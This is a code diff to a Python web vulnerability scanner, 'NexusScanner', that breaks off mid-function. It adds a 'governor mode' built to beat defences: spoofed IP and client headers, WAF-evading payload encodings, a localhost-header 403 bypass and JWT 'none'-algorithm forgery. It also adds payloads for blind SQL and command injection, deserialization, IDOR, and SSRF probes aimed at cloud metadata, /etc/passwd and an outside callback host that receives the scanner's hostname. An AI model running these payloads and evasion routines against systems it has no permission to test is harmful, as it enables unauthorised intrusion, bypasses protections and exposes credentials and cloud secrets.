@@ -54,7 +54,7 @@ class NexusScanner(QObject):
                  headless=True, proxychains=False, strict_validation=True, 
                  dynamic_timeout=False, ai_key=None, 
                  ai_model="llama3-70b-8192", 
-                 heuristic_mining=False, **kwargs): # FIX: Adicionado aqui
+                 heuristic_mining=False, governor_mode=False, **kwargs):
         super().__init__()
         self.targets = targets
         self.deep_scan = deep_scan
@@ -66,6 +66,7 @@ class NexusScanner(QObject):
         self.heuristic_mining = heuristic_mining 
         self.ai_key = ai_key
         self.ai_model = ai_model or "llama3-70b-8192"
+        self.governor_mode = governor_mode
         
         # UI Bypass Integration Options
         self.ip_rotation = kwargs.get('ip_rotation', False)
@@ -75,6 +76,11 @@ class NexusScanner(QObject):
         self.dom_polling = kwargs.get('dom_polling', False)
         self.error_bypass = kwargs.get('error_bypass', False)
         self.payload_encode = kwargs.get('payload_encode', False)
+        
+        # New Efficiency & Stealth options
+        self.active_403_bypass = kwargs.get('active_403_bypass', False)
+        self.header_rotation = kwargs.get('header_rotation', False)
+        self.auto_tune = kwargs.get('auto_tune', False)
         
         self.is_running = False
         self.discovered_forms = [] # Initialize to empty list
@@ -94,6 +100,19 @@ class NexusScanner(QObject):
         self.total_findings = 0
         self.critical_findings = 0
         self.request_count = 0
+        
+        # Heuristic WAF Profiling
+        self._waf_bypass_stats = {
+            'url_encode': 1,
+            'double_url_encode': 1,
+            'html_entity': 1,
+            'script_camel': 1,
+            'quotes_hex': 1,
+            'plain': 1
+        }
+        
+        # Deduplication
+        self.emitted_hashes = set()
         
         # Concurrency Control
         self.sem = asyncio.Semaphore(50) 
@@ -123,7 +142,14 @@ class NexusScanner(QObject):
 
     def get_headers(self):
         try:
-            user_agent = self.ua.random
+            # Dynamic header rotation feature
+            if getattr(self, 'header_rotation', False):
+                user_agent = self.ua.random
+            else:
+                # Cache a single fake UA if rotation is off to reduce fingerprinting noise
+                if not hasattr(self, '_cached_ua'):
+                    self._cached_ua = self.ua.random
+                user_agent = getattr(self, '_cached_ua', f"Nexus-Ultima-v20/{random.randint(100,999)}")
         except:
             user_agent = f"Nexus-Ultima-v20/{random.randint(100,999)}"
 
@@ -135,7 +161,7 @@ class NexusScanner(QObject):
             "Upgrade-Insecure-Requests": "1"
         }
         
-        if self.bypass_mode:
+        if self.bypass_mode or getattr(self, 'header_rotation', False):
             # ADVANCED HEADER SPOOFING
             spoofed_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
             headers.update({
@@ -149,6 +175,25 @@ class NexusScanner(QObject):
                 "Referer": "https://www.google.com/",
                 "X-Waf-Bypass": "true" # Sometimes works on weak configs
             })
+            if getattr(self, 'governor_mode', False):
+                headers.update({
+                    "X-Requested-With": "XMLHttpRequest",
+                    "DNT": "1",
+                    "Cache-Control": "max-age=0, no-cache",
+                    "Sec-Fetch-Dest": "document",
+                    "Sec-Fetch-Mode": "navigate",
+                    "Sec-Fetch-Site": "cross-site",
+                    "Priority": "u=0, i",
+                    "Pragma": "no-cache",
+                    "X-Forwarded-Host": f"{random.choice(string.ascii_lowercase)}.example.com",
+                    "X-Host": spoofed_ip,
+                    "True-Client-IP": spoofed_ip,
+                    # Extremo Anti-Bot Mitigation (Cloudflare / Datadome)
+                    "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
+                    "Sec-Ch-Ua-Mobile": "?0",
+                    "Sec-Ch-Ua-Platform": '"Windows"',
+                    "Accept-Encoding": "gzip, deflate, br, zstd"
+                })
             
         return headers
             
@@ -222,10 +267,10 @@ class NexusScanner(QObject):
                                       vuln = Vulnerability(target=domain, vuln_type="Subdomain Takeover", severity="CRITICAL", impact=f"Dangling CNAME to {cname}")
                                       self._emit_finding(vuln)
                                       self.log_message.emit(f"<span style='color:#ff0055'>[!] CRITICAL: SUBDOMAIN TAKEOVER Possible on {domain} (-> {cname})</span>")
-                         except:
-                             pass
-         except:
-             pass
+                         except Exception as e:
+                             self.log_message.emit(f"<span style='color:#aaaaaa'>[Debug] Takeover check failed for {cname}: {str(e)}</span>")
+         except Exception as e:
+             self.log_message.emit(f"<span style='color:#aaaaaa'>[Debug] DNS resolution failed for takeover check on {domain}: {str(e)}</span>")
 
     async def mine_parameters(self, url):
         """Attempts to find hidden debug parameters."""
@@ -361,14 +406,20 @@ class NexusScanner(QObject):
         
         if open_ports:
             self.log_message.emit(f"<span style='color:#00ff9d'>[+] DISCOVERED {len(open_ports)} OPEN PORTS:</span>")
+            
+            PORT_MAP = {
+                21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 
+                80: "HTTP", 110: "POP3", 111: "RPCBind", 135: "MSRPC", 139: "NetBIOS",
+                143: "IMAP", 443: "HTTPS", 445: "SMB", 465: "SMTPS", 514: "Syslog",
+                587: "SMTP (Submission)", 993: "IMAPS", 995: "POP3S", 1433: "MSSQL",
+                1521: "Oracle DB", 2082: "cPanel", 2083: "cPanel (SSL)", 2086: "WHM",
+                2087: "WHM (SSL)", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
+                5900: "VNC", 6379: "Redis", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt",
+                9200: "Elasticsearch", 27017: "MongoDB"
+            }
+            
             for p, banner in sorted(open_ports, key=lambda x: x[0]):
-                 service = "UNKNOWN"
-                 if p == 80: service = "HTTP"
-                 elif p == 443: service = "HTTPS"
-                 elif p == 22: service = "SSH"
-                 elif p == 21: service = "FTP"
-                 elif p == 3306: service = "MYSQL"
-                 
+                 service = PORT_MAP.get(p, "UNKNOWN")
                  output = f"    - Port {p}/tcp OPEN ({service})"
                  if banner:
                       output += f" | Banner: {banner[:40]}..."
@@ -499,7 +550,8 @@ class NexusScanner(QObject):
             
             # PII
             "Email Address": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
-            "IP Address (Internal)": r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.1[6-9]\.\d{1,3}\.\d{1,3}|172\.2[0-9]\.\d{1,3}\.\d{1,3}|172\.3[0-1]\.\d{1,3}\.\d{1,3})\b"
+            "IP Address (Internal)": r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.1[6-9]\.\d{1,3}\.\d{1,3}|172\.2[0-9]\.\d{1,3}\.\d{1,3}|172\.3[0-1]\.\d{1,3}\.\d{1,3})\b",
+            "JWT Token": r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+"
         }
         for title, regex in patterns.items():
             matches = re.findall(regex, content)
@@ -515,9 +567,42 @@ class NexusScanner(QObject):
                 self.sensitive_data_found.emit(title, display_val)
                 # Auto-save sensitive data evidence
                 self.save_evidence(source_url, f"Sensitive_Data_{title}", content)
+                
+                if title == "JWT Token" and getattr(self, 'governor_mode', False):
+                    asyncio.create_task(self._deep_analyze_jwt(source_url, display_val))
         
         # Check for credential pairs (Email/User + Password)
         self._scan_for_credentials(content, source_url)
+
+    async def _deep_analyze_jwt(self, url, token):
+        try:
+            parts = token.split('.')
+            if len(parts) != 3: return
+            
+            import base64, json
+            def decode_b64(s):
+                return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4)).decode('utf-8')
+            
+            header = json.loads(decode_b64(parts[0]))
+            payload = json.loads(decode_b64(parts[1]))
+            
+            self.log_message.emit(f"<span style='color:#00ff9d'>[Governor] Deep JWT Analysis: Algo={header.get('alg')} | Payload={str(payload)[:50]}...</span>")
+            
+            # Test 'None' Algorithm
+            header['alg'] = 'none'
+            encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
+            altered_token = f"{encoded_header}.{parts[1]}."
+            
+            headers = self.get_headers()
+            headers['Authorization'] = f"Bearer {altered_token}"
+            
+            s, c, _ = await self._safe_request('GET', url, headers=headers, timeout=5)
+            if s == 200 and len(c) > 0:
+                self.log_message.emit(f"<span style='color:#ff0055'>[!] CRITICAL: JWT 'none' algo bypass might be possible on {url}</span>")
+                vuln = Vulnerability(target=url, vuln_type="JWT Signature Bypass (None Algo)", severity="CRITICAL", impact="Token accepted without signature")
+                self._emit_finding(vuln)
+        except Exception:
+            pass
 
     def _scan_for_credentials(self, content, url):
         """Heuristic scan for credential pairs."""
@@ -596,10 +681,8 @@ class NexusScanner(QObject):
         retries = 3 if self.bypass_mode else 2
         for attempt in range(retries):
             try:
-                # We don't want to hang forever, but dynamic allows us to wait
                 timeout = aiohttp.ClientTimeout(total=base_timeout)
                 
-                # Smart Jitter on proxy mode to avoid ratelimits
                 if self.bypass_mode and hasattr(self, 'current_jitter_enabled'):
                      import random
                      await asyncio.sleep(random.uniform(0.5, 2.5))
@@ -610,31 +693,53 @@ class NexusScanner(QObject):
                 elif self.bypass_mode:
                     proxy = self.proxy_manager.get_proxy()
                     if not proxy and attempt == 0:
-                         # Try to wait a bit if pool is empty
                          await asyncio.sleep(2)
                          proxy = self.proxy_manager.get_proxy()
                 
+                # Time-based tracking for Blind Injection Heuristics
+                start_time = time.time()
+                
                 if method == 'GET':
                     async with self.session.get(url, proxy=proxy, timeout=timeout, **kwargs) as r:
+                         elapsed = time.time() - start_time
+                         self._track_baseline_latency(parsed_url=url, elapsed=elapsed)
                          self.request_count += 1
                          if self.request_count % 10 == 0:
                              self.stats_updated.emit(self.total_findings, self.critical_findings, self.request_count)
                          
-                         # Smart Error Bypass Evaluation
+                         if getattr(self, 'governor_mode', False) and r.status in [429, 403] and attempt < retries - 1:
+                             self.log_message.emit(f"<span style='color:#ff0055'>[Governor] Detected WAF Block ({r.status}). Engaging Adaptive Evasion...</span>")
+                             await asyncio.sleep(random.uniform(3.0, 8.0))
+                             
+                             if hasattr(self, 'sem') and self.sem._value > 2:
+                                  self.sem = asyncio.Semaphore(max(2, self.sem._value - 5))
+                                  self.log_message.emit(f"<span style='color:#aaaaaa'>[Governor] Throttled concurrency to {self.sem._value} to bleed WAF tracking.</span>")
+                             
+                             if self.bypass_mode and proxy: self.proxy_manager.remove_proxy(proxy)
+                             continue
+                             
                          if self.error_bypass and r.status in [401, 403, 500]:
                              return await self._attempt_error_bypass(url, r.status, kwargs)
                              
-                         return r.status, await r.read(), r.headers
+                         return r.status, await r.read(), r.headers, elapsed
                 elif method == 'POST':
                     async with self.session.post(url, proxy=proxy, timeout=timeout, **kwargs) as r:
+                         elapsed = time.time() - start_time
+                         self._track_baseline_latency(parsed_url=url, elapsed=elapsed)
                          self.request_count += 1
                          
+                         if getattr(self, 'governor_mode', False) and r.status in [429, 403] and attempt < retries - 1:
+                             self.log_message.emit(f"<span style='color:#ff0055'>[Governor] Detected WAF Block ({r.status}). Engaging Adaptive Evasion...</span>")
+                             await asyncio.sleep(random.uniform(3.0, 8.0))
+                             if self.bypass_mode and proxy: self.proxy_manager.remove_proxy(proxy)
+                             continue
+                             
                          if self.error_bypass and r.status in [401, 403, 500]:
                              return await self._attempt_error_bypass(url, r.status, kwargs, method='POST')
                              
-                         return r.status, await r.read(), r.headers
+                         return r.status, await r.read(), r.headers, elapsed
 
-            except (aiohttp.ClientPayloadError, aiohttp.ServerDisconnectedError, aiohttp.ClientConnectorError) as e:
+            except Exception as e:
                 # Connection stability errors - wait and retry
                 if attempt < retries - 1:
                     await asyncio.sleep(1 * (attempt + 1))
@@ -648,7 +753,16 @@ class NexusScanner(QObject):
                 if attempt == retries - 1:
                     return 0, b"", {}
                 await asyncio.sleep(0.5)
-        return 0, b"", {}
+        return 0, b"", {}, 0
+
+    def _track_baseline_latency(self, parsed_url, elapsed):
+        if not hasattr(self, '_latencies'): self._latencies = {}
+        host = urlparse(parsed_url).netloc
+        if host not in self._latencies:
+            self._latencies[host] = []
+        self._latencies[host].append(elapsed)
+        if len(self._latencies[host]) > 50:
+             self._latencies[host] = self._latencies[host][-50:] # Keep rolling window
 
     async def _attempt_error_bypass(self, url, original_status, kwargs, method='GET'):
         """Attempts to bypass 401/403/500 errors using path normalization and HTTP method toggling."""
@@ -667,9 +781,9 @@ class NexusScanner(QObject):
             try:
                 # Use GET regardless of original method to test access
                 async with self.session.get(test_url, timeout=5, **kwargs) as r:
-                    if r.status == 200:
-                        self.log_message.emit(f"<span style='color:#00ff9d'>[SUCCESS] Bypassed {original_status} using path: {b_path}</span>")
-                        return r.status, await r.read(), r.headers
+                     if r.status == 200:
+                         self.log_message.emit(f"<span style='color:#00ff9d'>[SUCCESS] Bypassed {original_status} using path: {b_path}</span>")
+                         return r.status, await r.read(), r.headers, 0
             except:
                 pass
                 
@@ -679,11 +793,36 @@ class NexusScanner(QObject):
              async with self.session.request(toggle_method, url, timeout=5, **kwargs) as r:
                  if r.status == 200:
                      self.log_message.emit(f"<span style='color:#00ff9d'>[SUCCESS] Bypassed {original_status} by switching to {toggle_method}</span>")
-                     return r.status, await r.read(), r.headers
+                     return r.status, await r.read(), r.headers, 0
         except:
              pass
 
-        return original_status, b"", {}
+        # Tactic 3: ACTIVE 403 BYPASS (Header Overrides)
+        if getattr(self, 'active_403_bypass', False):
+            self.log_message.emit(f"<span style='color:#ff00ff'>[Stealth] Injecting 403 Override Headers...</span>")
+            override_headers = kwargs.get('headers', self.get_headers()).copy()
+            override_headers.update({
+                "X-Original-URL": path,
+                "X-Rewrite-URL": path,
+                "X-Custom-IP-Authorization": "127.0.0.1",
+                "X-Forwarded-For": "127.0.0.1",
+                "X-Originating-IP": "127.0.0.1",
+                "X-Host": "127.0.0.1",
+                "Base-Url": "127.0.0.1"
+            })
+            
+            override_kwargs = kwargs.copy()
+            override_kwargs['headers'] = override_headers
+            
+            try:
+                 async with self.session.request(method, url, timeout=5, **override_kwargs) as r:
+                     if r.status == 200:
+                         self.log_message.emit(f"<span style='color:#00ff9d'>[SUCCESS] Bypassed {original_status} using 127.0.0.1 Localhost Header Spoofing!</span>")
+                         return r.status, await r.read(), r.headers, 0
+            except:
+                 pass
+
+        return original_status, b"", {}, 0
 
     def resolve_domain(self, hostname):
         """Uses dnspython, tldextract, and whois for comprehensive recon."""
@@ -707,7 +846,8 @@ class NexusScanner(QObject):
                 pass
                 
             return ips
-        except:
+        except Exception as e:
+            self.log_message.emit(f"<span style='color:#aaaaaa'>[Debug] DNS/Whois lookup failed for {hostname}: {str(e)}</span>")
             return []
 
     async def analyze_forms(self, url, content):
@@ -749,7 +889,33 @@ class NexusScanner(QObject):
 
     def apply_payload_encoding(self, payload):
         """Dynamically encodes payloads (URL, Base64) to prevent parser crashes and guarantee valid tokenization."""
-        if not self.payload_encode: return payload
+        import urllib.parse
+        
+        if getattr(self, 'governor_mode', False):
+            # Weighted random choice based on WAF Heuristics
+            strategies = {
+                'url_encode': lambda p: urllib.parse.quote(p),
+                'double_url_encode': lambda p: urllib.parse.quote(urllib.parse.quote(p)),
+                'html_entity': lambda p: p.replace("<", "%3C").replace(">", "%3E").replace(" ", "%20"),
+                'script_camel': lambda p: p.replace("script", "sCrIpT"),
+                'quotes_hex': lambda p: p.replace("'", "%27").replace('"', "%22"),
+                'plain': lambda p: p
+            }
+            
+            # Select strategy based on historical success weight
+            total_weight = sum(self._waf_bypass_stats.values())
+            r = random.uniform(0, total_weight)
+            upto = 0
+            selected_key = 'plain'
+            for key, weight in self._waf_bypass_stats.items():
+                if upto + weight >= r:
+                    selected_key = key
+                    break
+                upto += weight
+                
+            self._last_used_encoding = selected_key
+            return strategies[selected_key](payload)
+        if not getattr(self, 'payload_encode', False): return payload
         
         # Example contexts: sometimes a payload needs double URL encoding to reach backend
         import urllib.parse
@@ -762,76 +928,10 @@ class NexusScanner(QObject):
         encoded = random.choice(strategies)(payload)
         return encoded
 
-    async def fuzz_parameters(self, url, tech_stack):
-        """Fuzzes URL parameters for common vulnerabilities using massive payload lists."""
-        parsed = urlparse(url)
-        if not parsed.query: return
-        
-        params = parse_qs(parsed.query)
-        base_url = url.split('?')[0]
-        
-        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Fuzzing Parameters on {base_url} with Extended Payload Database...</span>")
-        
-        # Use centralized massive payload lists
-        # Format: Type -> (Payload List, Indicator List)
-        # Note: XSS handled specially via reflection
-        payload_groups = {
-            "SQLi": (Payloads.SQLI, Indicators.SQLI),
-            "LFI": (Payloads.LFI, Indicators.LFI),
-            "RCE": (Payloads.RCE, Indicators.RCE),
-            "SSTI": (Payloads.SSTI, Indicators.SSTI),
-            "ProtoPollution": (Payloads.PROTO_POLLUTION, ["Object", "Array"])
-        }
 
-        # XSS Check separately (reflection based)
-        for param, values in params.items():
-            # 1. Check XSS (Reflection)
-            for raw_payload in Payloads.XSS:
-                try:
-                    # Apply WAF Mutation and Context Encoding if Enabled
-                    payload = self.apply_waf_evasion(raw_payload) if self.waf_evasion else raw_payload
-                    payload = self.apply_payload_encoding(payload) if self.payload_encode else payload
-                    
-                    # Construct fuzzed URL
-                    fuzzed_query = urlencode({p: (values[0] if p != param else payload) for p in params})
-                    fuzzed_url = f"{base_url}?{fuzzed_query}"
-                    
-                    status, content, _ = await self._safe_request('GET', fuzzed_url)
-                    text_content = content.decode('utf-8', errors='ignore')
-                    
-                    if payload in text_content:
-                         # Simple reflection check
-                         vuln = Vulnerability(target=url, vuln_type="Reflected XSS", severity="High", impact=f"Payload reflected in {param}")
-                         self.finding_found.emit(vuln)
-                         self.log_message.emit(f"<span style='color:#ff0055'>[!] XSS FOUND on parameter '{param}'</span>")
-                         break # Stop after one XSS found
-                except: pass
-
-            # 2. Check Other Vulns (Indicator based)
-            for v_type, (p_list, indicators) in payload_groups.items():
-                for payload in p_list:
-                    try:
-                        fuzzed_query = urlencode({p: (values[0] if p != param else payload) for p in params})
-                        fuzzed_url = f"{base_url}?{fuzzed_query}"
-                        
-                        status, content, _ = await self._safe_request('GET', fuzzed_url)
-                        text_content = content.decode('utf-8', errors='ignore')
-                        
-                        # Check indicators
-                        for ind in indicators:
-                            if ind in text_content:
-                                 # Found!
-                                 vuln = Vulnerability(target=url, vuln_type=v_type, severity="Critical", impact=f"Indicator '{ind}' found with payload: {payload[:20]}...")
-                                 self.finding_found.emit(vuln)
-                                 self.log_message.emit(f"<span style='color:#ff0055'>[!] {v_type} DETECTED on parameter '{param}' (Indicator: {ind})</span>")
-                                 break # Stop checking this type for this param if found
-                        else:
-                            continue
-                        break # Break outer loop (payloads) if inner loop (indicators) broke
-                    except: pass
 
     async def detect_tech(self, url):
-        status, content, headers = await self._safe_request('GET', url, headers=self.get_headers(), timeout=5)
+        status, content, headers, _ = await self._safe_request('GET', url, headers=self.get_headers(), timeout=5)
         text_content = content.decode('utf-8', errors='ignore')
         self.extract_sensitive_data(text_content, url)
         await self.analyze_forms(url, text_content)
@@ -903,195 +1003,7 @@ class NexusScanner(QObject):
 
         async def check_path(path):
             full_url = f"{base_url}/{path}"
-            status, content, _ = await self._safe_request('GET', full_url, headers=self.get_headers(), allow_redirects=False, timeout=5)
-            
-            if status == 200:
-                if not self._validate_content(path, content):
-                    return
-
-                text_content = content.decode('utf-8', errors='ignore')
-                self.extract_sensitive_data(text_content, full_url)
-                
-                vuln_name = "Sensitive File Exposure"
-                if path == ".env" and b"APP_KEY" in content: vuln_name = "Critical .env Exposure"
-                
-                vuln = Vulnerability(target=full_url, vuln_type=vuln_name, severity="CRITICAL", impact=f"Exposed {path}")
-                self._emit_finding(vuln)
-                self.log_message.emit(f"<span style='color:#ff0055'>[!] VULNERABILITY: {vuln_name} at {full_url}</span>")
-                
-                # Auto-save critical file evidence (EXACT BYTES)
-                self.save_evidence(full_url, vuln_name, content)
-
-        for path in self.sensitive_paths: tasks.append(check_path(path))
-        for i in range(0, len(tasks), 10):
-            if not self.is_running: break
-            await asyncio.gather(*tasks[i:i+10])
-
-    async def fuzz_parameters(self, url, tech_stack):
-        """Fuzzes URL parameters for common vulnerabilities using massive payload lists."""
-        parsed = urlparse(url)
-        if not parsed.query: return
-        
-        params = parse_qs(parsed.query)
-        base_url = url.split('?')[0]
-        
-        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Fuzzing Parameters on {base_url} with Extended Payload Database...</span>")
-        
-        # Use centralized massive payload lists
-        # Format: Type -> (Payload List, Indicator List)
-        # Note: XSS handled specially via reflection
-        payload_groups = {
-            "SQLi": (Payloads.SQLI, Indicators.SQLI),
-            "LFI": (Payloads.LFI, Indicators.LFI),
-            "RCE": (Payloads.RCE, Indicators.RCE),
-            "SSTI": (Payloads.SSTI, Indicators.SSTI),
-            "ProtoPollution": (Payloads.PROTO_POLLUTION, ["Object", "Array"])
-        }
-        
-        # Heuristic Mode Expansion
-        if self.heuristic_mining:
-             self.log_message.emit(f"<span style='color:#ff0055'>[HEURISTIC] Injecting Deep Time-based Blind SQLi & DOM Closures on {len(params)} parameters!</span>")
-             deep_sqli = [
-                 "1' AND SLEEP(5)--", "1' WAITFOR DELAY '0:0:5'--",
-                 "1 OR pg_sleep(5)--", "1' OR (SELECT 1 FROM (SELECT SLEEP(5))A)--"
-             ]
-             deep_xss = [
-                 "\"><svg/onload=alert(1)>", "'-alert(1)-'", "\\\";alert(1);//"
-             ]
-             payload_groups["SQLi_Blind"] = (deep_sqli, []) # Evaluated by Time
-             
-             # Expand standard XSS payloads locally for deep mode
-             Payloads.XSS.extend(deep_xss)
-
-        # XSS Check separately (reflection based)
-        for param, values in params.items():
-            # 1. Check XSS (Reflection)
-            for payload in Payloads.XSS:
-                try:
-                    # Construct fuzzed URL
-                    fuzzed_query = urlencode({p: (values[0] if p != param else payload) for p in params})
-                    fuzzed_url = f"{base_url}?{fuzzed_query}"
-                    
-                    status, content, _ = await self._safe_request('GET', fuzzed_url)
-                    text_content = content.decode('utf-8', errors='ignore')
-                    
-                    if payload in text_content:
-                         # Simple reflection check
-                         vuln = Vulnerability(target=url, vuln_type="Reflected XSS", severity="High", impact=f"Payload reflected in {param}")
-                         self.finding_found.emit(vuln)
-                         self.log_message.emit(f"<span style='color:#ff0055'>[!] XSS FOUND on parameter '{param}'</span>")
-                         break # Stop after one XSS found
-                except: pass
-
-            # 2. Check Other Vulns (Indicator based and Time Based)
-            for v_type, (p_list, indicators) in payload_groups.items():
-                for payload in p_list:
-                    try:
-                        fuzzed_query = urlencode({p: (values[0] if p != param else payload) for p in params})
-                        fuzzed_url = f"{base_url}?{fuzzed_query}"
-                        
-                        start_time = time.time()
-                        status, content, _ = await self._safe_request('GET', fuzzed_url)
-                        elapsed = time.time() - start_time
-                        
-                        # Heuristic Time-based Blind SQLi Detection
-                        if v_type == "SQLi_Blind" and elapsed >= 4.5:
-                             vuln = Vulnerability(target=url, vuln_type="Time-Based Blind SQLi", severity="Critical", impact=f"Server stalled for {elapsed:.2f}s on parameter '{param}'")
-                             self.finding_found.emit(vuln)
-                             self.log_message.emit(f"<span style='color:#ff0055'>[!] {v_type} DETECTED on parameter '{param}' (Time: {elapsed:.2f}s)</span>")
-                             break
-                             
-                        text_content = content.decode('utf-8', errors='ignore')
-                        
-                        # Check indicators
-                        for ind in indicators:
-                            if ind in text_content:
-                                 # Found!
-                                 vuln = Vulnerability(target=url, vuln_type=v_type, severity="Critical", impact=f"Indicator '{ind}' found with payload: {payload[:20]}...")
-                                 self.finding_found.emit(vuln)
-                                 self.log_message.emit(f"<span style='color:#ff0055'>[!] {v_type} DETECTED on parameter '{param}' (Indicator: {ind})</span>")
-                                 break # Stop checking this type for this param if found
-                        else:
-                            continue
-                        break # Break outer loop (payloads) if inner loop (indicators) broke
-                    except: pass
-
-
-
-    async def detect_tech(self, url):
-        status, content, headers = await self._safe_request('GET', url, headers=self.get_headers(), timeout=5)
-        text_content = content.decode('utf-8', errors='ignore')
-        self.extract_sensitive_data(text_content, url)
-        await self.analyze_forms(url, text_content)
-        await self.analyze_js_files(url) 
-        
-        tech_stack = []
-        server = headers.get('Server', '').lower()
-        powered = headers.get('X-Powered-By', '').lower()
-        
-        if 'php' in powered or 'php' in server: tech_stack.append('php')
-        if 'asp' in powered or 'iis' in server: tech_stack.append('asp')
-        if 'nginx' in server: tech_stack.append('nginx')
-        if 'express' in powered or 'node' in powered: tech_stack.append('node')
-        
-        return tech_stack
-
-    def _validate_content(self, path, content):
-        """Validates content to STRICTLY prevent HTML soft-404s from being saved as evidence."""
-        if not content: return False
-        
-        # Convert snippet to lower for case-insensitive checking
-        header = content[:1500].lower()
-        
-        # STRONG indicators of HTML/SPA (React, Vue, Vite, etc)
-        spa_indicators = [
-            b"<!doctype html", b"<html", b"<body", b"<div id=\"root\"", 
-            b"<div id=\"app\"", b"vite-plugin-pwa", b"react", b"vue", 
-            b"angular", b"nextjs"
-        ]
-        
-        # Check if it looks like a webpage
-        is_webpage = any(ind in header for ind in spa_indicators)
-
-        if path.endswith(".sql"):
-            # SQL MUST have SQL keywords and MUST NOT be a webpage
-            sql_keywords = [b"insert into", b"create table", b"drop table", b"select ", b"values (", b"-- dumping data"]
-            has_sql = any(k in header for k in sql_keywords)
-            return has_sql and not is_webpage
-            
-        if path.endswith(".env"):
-            # Env MUST have key=value pairs and MUST NOT be a webpage
-            has_assign = b"=" in content and b"\n" in content
-            return has_assign and not is_webpage
-            
-        if path.endswith(".git/config"):
-            return b"[core]" in content or b"[remote" in content
-            
-        if path.endswith("id_rsa"):
-            return b"PRIVATE KEY" in content
-            
-        if path.endswith(".yml") or path.endswith(".yaml"):
-            return b":" in content and not is_webpage
-            
-        if path.endswith(".php"):
-             if "phpinfo" in path:
-                 return b"phpinfo()" in content or b"PHP Version" in content
-             # For config.php, if it's executable code (<?php), it's valid finding
-             if b"<?php" in content: return True
-             return False
-        
-        # Default: If it looks like a webpage, reject it (unless we are looking for a webpage?)
-        if is_webpage: return False
-        
-        return True
-
-    async def check_sensitive_files(self, url):
-        base_url = url.rstrip('/')
-        tasks = []
-
-        async def check_path(path):
-            full_url = f"{base_url}/{path}"
-            status, content, _ = await self._safe_request('GET', full_url, headers=self.get_headers(), allow_redirects=False, timeout=5)
+            status, content, _, _ = await self._safe_request('GET', full_url, headers=self.get_headers(), allow_redirects=False, timeout=5)
             
             if status == 200:
                 if not self._validate_content(path, content):
@@ -1139,6 +1051,25 @@ class NexusScanner(QObject):
         else:
             active_payloads['RCE'] = Payloads.RCE
 
+        if getattr(self, 'governor_mode', False):
+            active_payloads['IDOR'] = ['1', '2', '0', '-1', '9999999999', 'admin', '00000000-0000-0000-0000-000000000000', '[]']
+            active_payloads['Blind SQLi (Time)'] = ["'; WAITFOR DELAY '0:0:6'--", "1' AND SLEEP(6)--", "1 OR pg_sleep(6)--"]
+            active_payloads['Blind RCE (Time)'] = ["; sleep 6", "| sleep 6", "`sleep 6`"]
+            active_payloads['Deserialization'] = [
+                'O:8:"stdClass":0:{}', 
+                'rO0ABXNyAA5qYXZhLmxhbmcuTG9uZw;', 
+                'Tzo4OiJzdGRDbGFzcyI6MDp7fQ==' # B64 PHP
+            ]
+            import socket
+            hostname = socket.gethostname()
+            active_payloads['Blind SSRF / OOB'] = [
+                f"http://127.0.0.1:22",
+                f"file:///etc/passwd",
+                f"http://localhost/admin",
+                f"http://169.254.169.254/latest/meta-data/",
+                f"http://pingb.in/p/{hostname}" # Interaction simulation mock
+            ]
+
         # Load safe_fuzz_cases dynamically to improve performance
         try:
             import json, os
@@ -1170,9 +1101,13 @@ class NexusScanner(QObject):
                  self._inject(parsed, params, param, payload, "Potential SSRF", "CRITICAL", ["sheriff-token"], queue)
 
         # 3. Start Workers
-        # Fixed concurrency of 10 workers for stability on Windows/qasync
+        # Check auto-tune flag to massively scale concurrency
+        worker_count = 50 if getattr(self, 'auto_tune', False) else 10
+        if getattr(self, 'auto_tune', False):
+             self.log_message.emit(f"<span style='color:#ffff00'>[⚡] Auto-Tune Active: Launching {worker_count} concurrent fuzzing agents...</span>")
+        
         workers = []
-        for _ in range(10):
+        for _ in range(worker_count):
             task = asyncio.create_task(self._fuzz_worker(queue))
             workers.append(task)
             
@@ -1184,7 +1119,16 @@ class NexusScanner(QObject):
 
     def _inject(self, parsed, params, param, payload, vuln_type, severity, indicators, queue):
         fuzzed_query = params.copy()
-        fuzzed_query[param] = [payload]
+        
+        # HTTP Parameter Pollution (HPP) in Governor Mode
+        if getattr(self, 'governor_mode', False) and vuln_type == 'IDOR' and payload == 'admin':
+            fuzzed_query[param] = ['user', payload]  # Sends ?param=user&param=admin
+        elif getattr(self, 'governor_mode', False) and vuln_type == 'IDOR' and payload == '[]':
+            del fuzzed_query[param]
+            fuzzed_query[f"{param}[]"] = ['1']
+        else:
+            fuzzed_query[param] = [self.apply_payload_encoding(payload)]
+            
         new_query = urlencode(fuzzed_query, doseq=True)
         target_url = urlunparse(parsed._replace(query=new_query))
         
@@ -1210,9 +1154,30 @@ class NexusScanner(QObject):
     async def _do_fuzz_request(self, url, vuln_type, severity, indicators):
          # No Semaphore needed here as concurrency is limited by worker count
          try:
-             status, content, _ = await self._safe_request('GET', url, headers=self.get_headers(), timeout=5)
+             # Cloud SSRF Headers
+             headers = self.get_headers()
+             if vuln_type == 'Blind SSRF / OOB':
+                  headers.update({
+                      "Metadata": "true",
+                      "Metadata-Flavor": "Google",
+                      "X-Google-Metadata-Request": "True"
+                  })
+
+             status, content, _, latency = await self._safe_request('GET', url, headers=headers, timeout=12)
              text_content = content.decode('utf-8', errors='ignore')
              self.extract_sensitive_data(text_content, url)
+             
+             # Time-based evaluation
+             if vuln_type in ["Blind SQLi (Time)", "Blind RCE (Time)"]:
+                 host = urlparse(url).netloc
+                 if hasattr(self, '_latencies') and host in self._latencies:
+                     avg = sum(self._latencies[host]) / len(self._latencies[host])
+                     # If it took longer than baseline + 5.5s (sleep was 6)
+                     if latency > (avg + 5.5):
